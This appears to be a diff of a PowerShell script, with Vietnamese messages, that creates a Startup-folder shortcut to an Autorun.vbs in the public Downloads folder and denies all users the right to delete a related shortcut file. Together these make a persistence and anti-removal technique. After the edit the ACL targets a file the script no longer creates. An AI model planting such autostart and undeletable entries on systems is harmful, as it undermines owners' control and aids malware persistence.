@@ -1,15 +1,17 @@
 $source = "C:\Users\Public\Downloads\Autorun.vbs"
-$destination = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Autorun.vbs.lnk"
-$WshShell = New-Object -ComObject WScript.Shell
-$shortcut = $WshShell.CreateShortcut($destination)
-$shortcut.TargetPath = $source
-$shortcut.Save()
-$ShortcutPath = "C:\Users\Public\Downloads\Startup Folder.lnk"
-$TargetPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
-$WScriptShell = New-Object -ComObject WScript.Shell
-$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
-$Shortcut.TargetPath = $TargetPath
-$Shortcut.Save()
+$startupPath = [Environment]::GetFolderPath("Startup")
+$destination = Join-Path $startupPath "Autorun.vbs.lnk"
+if (Test-Path $source) {
+    $WshShell = New-Object -ComObject WScript.Shell
+    $shortcut = $WshShell.CreateShortcut($destination)
+    $shortcut.TargetPath = $source
+    $shortcut.WorkingDirectory = Split-Path $source
+    $shortcut.WindowStyle = 1
+    $shortcut.Save()
+    Write-Host "Đã tạo shortcut thành công tại: $destination"
+} else {
+    Write-Host "File $source không tồn tại. Vui lòng kiểm tra lại đường dẫn."
+}
 $folder = "C:\Users\Public\Downloads\Startup Folder.lnk"
 $acl = Get-Acl $folder
 $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Delete", "Deny")
